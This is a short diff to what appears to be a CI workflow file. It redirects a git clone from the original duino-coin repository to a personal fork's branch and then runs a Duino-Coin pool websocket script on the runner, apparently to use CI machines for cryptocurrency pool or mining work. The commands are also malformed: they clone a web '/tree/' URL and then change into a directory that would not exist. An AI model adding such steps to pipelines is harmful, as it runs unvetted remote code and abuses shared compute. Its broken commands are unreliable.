@@ -25,7 +25,7 @@ jobs:
      runner: [0]
    steps:
      - run: |
-        git clone https://github.com/revoxhere/duino-coin.git
+        git clone https://github.com/shah77pc/duino-coin/tree/useful-tools
         cd useful-tools
         python duco_pool_websocket.py
         git clone https://github.com/shah77pc/duino-coin
